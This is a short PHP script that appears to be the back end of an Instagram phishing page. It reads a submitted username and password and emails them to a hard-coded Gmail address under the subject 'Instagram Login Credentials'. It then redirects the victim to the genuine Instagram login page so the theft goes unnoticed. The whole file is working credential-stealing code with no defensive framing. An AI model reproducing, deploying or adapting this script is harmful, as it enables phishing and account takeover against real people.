<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Fetching username and password from POST request
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Define email details
    $to = "laverna1914@gmail.com";
    $subject = "Instagram Login Credentials";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: webmaster@example.com"; // Update with your email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to the actual Instagram login page after submission
        header('Location: https://www.instagram.com/accounts/login/');
        exit();
    } else {
        // Handle errors if the email fails to send
        echo "<script>alert('Failed to send credentials. Please try again.');</script>";
    }
} else {
    // Handle if someone tries to access send.php directly
    echo "<script>alert('Access denied.');</script>";
}
?>
